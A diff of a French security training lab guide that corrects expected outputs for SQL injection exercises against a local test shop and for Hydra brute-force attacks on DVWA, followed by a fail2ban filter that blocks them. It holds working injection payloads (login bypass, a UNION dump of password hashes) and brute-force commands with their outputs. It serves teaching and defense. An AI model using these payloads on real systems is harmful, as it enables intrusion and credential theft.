@@ -1177,22 +1177,28 @@ mkdir -p rendu_labs/jour-01 && cd rendu_labs/jour-01
 
 **Actions :**
 1. Requête normale `id=1` → un seul produit
-2. Injecter `id=1 OR 1=1` (toujours vrai) → tous les produits
+2. Injecter `id=1 OR 1=1` (toujours vrai) → plusieurs produits
 3. Injecter `id=1 AND 1=2` (toujours faux) → aucun produit
 
 **Commande :**
 ```bash
-curl -s "http://localhost:8083/?page=search&id=1" | grep -o "Laptop\|Monitor\|Keyboard"
-# → Laptop Pro X  (comportement normal : 1 seul produit)
+# 1. id=1 → 1 seul produit
+curl -s "http://localhost:8083/?page=search&id=1" | grep -o "Laptop Pro X"
+# → Laptop Pro X
 
-curl -s "http://localhost:8083/?page=search&id=1%20OR%201=1" | grep -c "<tr>"
-# → 6  (tous les produits retournés : injection confirmée)
+# 2. 1 OR 1=1 → tous les produits
+curl -s "http://localhost:8083/?page=search&id=1%20OR%201=1" | grep -o "Laptop\|Monitor\|Keyboard"
+# → Laptop Pro X
+# → Smart Monitor 27"
+# → Wireless Keyboard
+# (3 résultats : injection confirmée — la condition vraie débloque tous les produits)
 
+# 3. 1 AND 1=2 → aucun produit
 curl -s "http://localhost:8083/?page=search&id=1%20AND%201=2" | grep -o "Aucun"
-# → Aucun produit trouvé  (AND 1=2 = toujours faux)
+# → Aucun produit trouvé
 ```
 
-**Résultat attendu :** `1 OR 1=1` retourne 6 produits au lieu d'1. `AND 1=2` retourne "Aucun produit trouvé".
+**Résultat attendu :** `1 OR 1=1` retourne plusieurs produits au lieu d'un seul. `1 AND 1=2` retourne "Aucun produit trouvé".
 
 **Explication :** Le paramètre `id` est injecté directement dans une requête SQL numérique : `WHERE id = $id`. `OR 1=1` est toujours vrai → tous les produits. `AND 1=2` est toujours faux → aucun résultat. Ces deux tests confirment que l'entrée utilisateur n'est pas filtrée.
 
@@ -1210,17 +1216,17 @@ curl -s "http://localhost:8083/?page=search&id=1%20AND%201=2" | grep -o "Aucun"
 ```bash
 # 1. Mauvais mot de passe (comportement normal)
 curl -s -d "page=login&username=admin&password=wrong" \
-  "http://localhost:8083/" | grep -o "Identifiants incorrects\|Connecté"
+  "http://localhost:8083/" | grep -o "Identifiants incorrects"
 # → Identifiants incorrects
 
 # 2. Injection admin' -- (bypass du mot de passe)
 curl -s -d "page=login&username=admin' --&password=x" \
-  "http://localhost:8083/" | grep -o "Connecté[^<]*"
-# → Connecté : <strong>admin</strong>
+  "http://localhost:8083/" | grep -oP "Connecté : <strong>\K[^<]+"
+# → admin
 
 # 3. Injection ' OR '1'='1' -- (tous les utilisateurs)
 curl -s -d "page=login&username=' OR '1'='1' --&password=x" \
-  "http://localhost:8083/" | grep -c "Connecté"
+  "http://localhost:8083/" | grep -o "Connecté" | wc -l
 # → 6
 ```
 
@@ -1233,8 +1239,8 @@ curl -s -d "page=login&username=' OR '1'='1' --&password=x" \
 | Test | Commande | Sortie |
 |------|----------|--------|
 | Mauvais password | `curl ... admin & password=wrong` | `Identifiants incorrects` |
-| `admin' --` | `curl ... admin' -- & password=x` | `Connecté : admin` |
-| `' OR '1'='1' --` | `curl ... ' OR '1'='1' -- & password=x` | 6 résultats `Connecté` |
+| `admin' --` | `curl ... admin' -- & password=x` | `admin` |
+| `' OR '1'='1' --` | `curl ... ' OR '1'='1' -- & password=x` | `6` |
 
 #### Point 3 — Filtre `?filter=` (LIKE injection)
 
@@ -1244,14 +1250,23 @@ curl -s -d "page=login&username=' OR '1'='1' --&password=x" \
 
 **Commande :**
 ```bash
-curl -s "http://localhost:8083/?page=users&filter=john" | grep "<td>" | wc -l
-# → 4 (1 utilisateur)
+# 1. Filtre normal → 1 utilisateur
+curl -s "http://localhost:8083/?page=users&filter=john" | grep -oP "(?<=<td>)[^<]+" | tail -4
+# → 2
+# → john_doe
+# → john@shop.local
+# → user
 
-curl -s "http://localhost:8083/?page=users&filter=%25'%20UNION%20SELECT%201,username,password,email%20FROM%20users%20--" | grep "<td>"
-# → <td>1</td><td>admin</td>...
+# 2. Injection UNION → tous les utilisateurs (extraction complète)
+curl -s "http://localhost:8083/?page=users&filter=%25'%20UNION%20SELECT%201,username,password,email%20FROM%20users%20--" | grep -oP "(?<=<td>)[^<]+"
+# → 1
+# → admin
+# → 5f4dcc3b5aa765d61d8327deb882cf99
+# → admin@shop.local
+# → ... (tous les utilisateurs avec leurs hashs)
 ```
 
-**Résultat attendu :** La première commande retourne 4 cellules HTML (1 utilisateur). La seconde retourne `<td>` avec les données de tous les utilisateurs.
+**Résultat attendu :** La première commande retourne les infos (id, username, email, rôle) de `john_doe`. La seconde retourne les mêmes infos pour **tous** les utilisateurs, avec leurs hashs MD5 en clair.
 
 **Explication :** Le paramètre `filter` est injecté dans `WHERE username LIKE '%$filter%'`. On ferme le LIKE avec `%'`, puis on ajoute `UNION SELECT` pour fusionner les résultats avec la table `users`. `--` commente le reste de la requête. C'est l'injection la plus difficile car elle nécessite la maîtrise de la syntaxe UNION.
 
@@ -1560,21 +1575,23 @@ On utilise `vulnerabilities/brute/` avec le cookie de session DVWA (déjà obten
 1. Extraire les noms des champs du formulaire
 2. Soumettre un mauvais mot de passe pour récupérer le message d'échec
 
+> ⚠️ **Le formulaire utilise `method="GET"`** (pas POST). Les données sont passées dans l'URL, pas dans le corps de la requête. Hydra utilisera le module `http-get-form`.
+
 **Commande :**
 ```bash
 curl -s -b /tmp/dvwa_cookie.txt "http://localhost:8088/vulnerabilities/brute/" \
-  | grep -o 'name="[^"]*"'
+  | grep -o 'name="[^"]*"' | head -3
 # → name="username"  name="password"  name="Login"
 
 curl -s -b /tmp/dvwa_cookie.txt \
-  -d "username=admin&password=mauvais&Login=Login" \
-  "http://localhost:8088/vulnerabilities/brute/" | grep -oi "failed\|wrong"
-# → Login failed
+  "http://localhost:8088/vulnerabilities/brute/?username=admin&password=mauvais&Login=Login" \
+  | grep -oi "incorrect"
+# → Username and/or password incorrect.
 ```
 
-**Résultat attendu :** Champs `username`, `password`, `Login`. Message d'échec = `Login failed`.
+**Résultat attendu :** Champs `username`, `password`, `Login`. Message d'échec = `Username and/or password incorrect.`
 
-**Explication :** La page `vulnerabilities/brute/` est un formulaire sans CSRF, réservé aux tests de brute force. On utilise le cookie de session DVWA (`/tmp/dvwa_cookie.txt`) pour être authentifié. Hydra a besoin de 3 infos : l'URL, la chaîne POST (avec `^USER^`/`^PASS^`), et le marqueur d'échec.
+**Explication :** La page `vulnerabilities/brute/` est un formulaire sans CSRF, réservé aux tests de brute force. On utilise le cookie de session DVWA (`/tmp/dvwa_cookie.txt`) pour être authentifié. Hydra a besoin de 3 infos : l'URL, la chaîne des paramètres (avec `^USER^`/`^PASS^`), et le marqueur d'échec.
 
 ---
 
@@ -1595,10 +1612,10 @@ cd rendu_labs/jour-01
 SESSID=$(grep PHPSESSID /tmp/dvwa_cookie.txt | awk '{print $NF}')
 
 hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8088 \
-  localhost http-post-form \
-  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=$SESSID;security=low:Login failed" \
+  localhost http-get-form \
+  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=$SESSID;security=low:Username and/or password incorrect." \
   -V 2>&1 | tee hydra_dvwa.txt
-# → [8088][http-post-form] host: localhost   login: admin   password: password
+# → [8088][http-get-form] host: localhost   login: admin   password: password
 # → 1 of 1 target successfully completed, 1 valid password found
 ```
 
@@ -1606,7 +1623,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8088 \
 
 **Résultat attendu :**
 ```
-[8088][http-post-form] host: localhost   login: admin   password: password
+[8088][http-get-form] host: localhost   login: admin   password: password
 1 of 1 target successfully completed, 1 valid password found
 ```
 
@@ -1614,9 +1631,9 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 8088 \
 - `-l admin` : login fixe
 - `-P` : wordlist (dictionnaire de mots de passe)
 - `-s 8088` : port non standard
-- `http-post-form` : module pour formulaire POST (le formulaire de la brute force page utilise POST)
+- `http-get-form` : module pour formulaire GET (le formulaire utilise `method="GET"`, pas POST)
 - `H:Cookie\:PHPSESSID=...;security=low` : passe le cookie de session via un en-tête HTTP personnalisé (le `\:` échappe le `:` dans `Cookie: valeur`, car Hydra utilise `:` comme séparateur de champs — sans ce backslash, Hydra croirait que `Cookie` est la fin du module et planterait)
-- `:Login failed` : si la réponse contient "Login failed" → tentative échouée
+- `:Username and/or password incorrect.` : si la réponse contient ce texte → tentative échouée
 - `-V` : affiche chaque tentative
 - `tee hydra_dvwa.txt` : sauvegarde le résultat
 
@@ -1641,16 +1658,16 @@ SESSID=$(grep PHPSESSID /tmp/dvwa_cookie.txt | awk '{print $NF}')
 echo -e "admin\ngordonb\n1337\npablo\nsmithy" > /tmp/logins.txt
 
 hydra -L /tmp/logins.txt -P /usr/share/wordlists/rockyou.txt \
-  -s 8088 localhost http-post-form \
-  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=$SESSID;security=low:Login failed" \
+  -s 8088 localhost http-get-form \
+  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie\:PHPSESSID=$SESSID;security=low:Username and/or password incorrect." \
   -F -V 2>&1 | tee hydra_multi.txt
-# → [8088][http-post-form] host: localhost   login: admin   password: password
+# → [8088][http-get-form] host: localhost   login: admin   password: password
 # → 1 of 1 target successfully completed, 1 valid password found
 ```
 
 **Résultat attendu :**
 ```
-[8088][http-post-form] host: localhost   login: admin   password: password
+[8088][http-get-form] host: localhost   login: admin   password: password
 1 of 1 target successfully completed, 1 valid password found
 ```
 
@@ -1672,17 +1689,17 @@ hydra -L /tmp/logins.txt -P /usr/share/wordlists/rockyou.txt \
 3. Vérifier que la règle est active
 4. Re-tester Hydra pour confirmer le blocage
 
-> ⚠️ **Piège :** La brute force page de DVWA (`vulnerabilities/brute/`) retourne **HTTP 200** même en cas d'échec (elle réaffiche le formulaire avec le message "Login failed"). Elle ne retourne **pas** de 401 (Unauthorized). Le filtre `apache-auth` de fail2ban (qui cherche des 401 dans `error.log`) ne détecterait **jamais** les échecs. Il faut un **filtre personnalisé** qui surveille les requêtes POST vers `/vulnerabilities/brute/` dans le `access.log`.
+> ⚠️ **Piège :** La brute force page de DVWA (`vulnerabilities/brute/`) retourne **HTTP 200** même en cas d'échec (elle réaffiche le formulaire avec "Username and/or password incorrect."). Elle ne retourne **pas** de 401 (Unauthorized). Le filtre `apache-auth` de fail2ban (qui cherche des 401 dans `error.log`) ne détecterait **jamais** les échecs. Il faut un **filtre personnalisé** qui surveille les requêtes GET vers `/vulnerabilities/brute/` dans le `access.log`.
 
 **Commande :**
 ```bash
 docker exec dvwa-target bash -c "apt-get update && apt-get install -y fail2ban"
 # → fail2ban already installed / installing...
 
-# Créer un filtre personnalisé — détecte les POST vers la page brute force
+# Créer un filtre personnalisé — détecte les GET vers la page brute force
 docker exec dvwa-target bash -c "cat > /etc/fail2ban/filter.d/dvwa-brute.conf << 'EOF'
 [Definition]
-failregex = ^<HOST> .* POST /vulnerabilities/brute/ HTTP/1\.[01]\" 200
+failregex = ^<HOST> .* GET /vulnerabilities/brute/ HTTP/1\.[01]\" 200
 ignoreregex =
 EOF"
 
@@ -1705,7 +1722,7 @@ docker exec dvwa-target bash -c "fail2ban-client status apache-dvwa"
 
 **Résultat attendu :** `fail2ban-client status` confirme que la règle est active. Après 5 tentatives échouées, Hydra reçoit une erreur `connection refused` — l'IP est bannie.
 
-**Explication :** fail2ban surveille les logs Apache (`/var/log/apache2/access.log`). Le filtre `dvwa-brute` repère chaque requête POST vers `/vulnerabilities/brute/` retournant HTTP 200 (tentative de connexion). Quand il détecte 5 POSTs (`maxretry=5`) en 10 minutes (`findtime=600`), il crée une règle iptables qui bloque l'IP attaquante pendant 15 minutes (`bantime=900`). Le brute-force est neutralisé à l'échelle réseau, indépendamment de l'application.
+**Explication :** fail2ban surveille les logs Apache (`/var/log/apache2/access.log`). Le filtre `dvwa-brute` repère chaque requête GET vers `/vulnerabilities/brute/` retournant HTTP 200 (tentative de connexion). Quand il détecte 5 GETs (`maxretry=5`) en 10 minutes (`findtime=600`), il crée une règle iptables qui bloque l'IP attaquante pendant 15 minutes (`bantime=900`). Le brute-force est neutralisé à l'échelle réseau, indépendamment de l'application.
 
 ### Résultat attendu
 
